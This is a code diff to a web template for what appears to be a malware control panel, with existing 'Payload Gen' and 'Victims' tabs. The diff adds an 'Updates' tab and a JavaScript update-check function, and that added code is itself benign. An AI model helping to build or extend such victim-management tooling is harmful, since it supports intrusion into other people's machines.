@@ -12,6 +12,7 @@
   <a href="{{ url_for('dashboard') }}" class="nav-item active"><i class="fas fa-chart-pie"></i><span>Dashboard</span></a>
   <a href="#gen" class="nav-item" onclick="showTab('gen')"><i class="fas fa-virus"></i><span>Payload Gen</span></a>
   <a href="#victims" class="nav-item" onclick="showTab('victims')"><i class="fas fa-desktop"></i><span>Victims</span></a>
+  <a href="#update" class="nav-item" onclick="showTab('update')"><i class="fas fa-cloud-download-alt"></i><span>Updates</span></a>
   <div class="sidebar-foot">
     <span class="user-badge"><i class="fas fa-user-shield"></i> {{ session.username }}</span>
     <a href="{{ url_for('logout') }}"><i class="fas fa-sign-out-alt"></i> Logout</a>
@@ -73,8 +74,28 @@
 </nav>
 {% endif %}
 </section>
+
+<section class="panel" id="panel-update" style="display:none">
+<h2><i class="fas fa-cloud-download-alt"></i> 检查更新</h2>
+<p style="color:#94a3b8;margin-bottom:16px">当前版本: <b style="color:#4dc3fa">1.0.0</b></p>
+<button class="btn btn-red" onclick="checkUpdate()"><i class="fas fa-sync-alt"></i> 检查更新</button>
+<div id="update-result" style="margin-top:16px"></div>
+</section>
+
 </main>
 <script>
+function checkUpdate(){
+  var r=document.getElementById('update-result');
+  r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在检查...</span>';
+  fetch('/update').then(x=>x.json()).then(d=>{
+    if(d.update){
+      var info=d.latest_commit?('最新提交: <b>'+d.latest_commit+'</b> — '+d.message):('最新版本: <b>'+d.latest+'</b>');
+      r.innerHTML='<div class="gen-ok"><i class="fas fa-arrow-circle-up"></i> 有新版本<br>'+info+'</div>';
+    }else{
+      r.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> 已是最新 ('+d.current+')</div>';
+    }
+  }).catch(e=>{r.innerHTML='<div class="gen-err">检查失败: '+e+'</div>';});
+}
 function showTab(t){
   document.querySelectorAll('.panel').forEach(p=>p.style.display='none');
   var el=document.getElementById('panel-'+t);if(el)el.style.display='block';
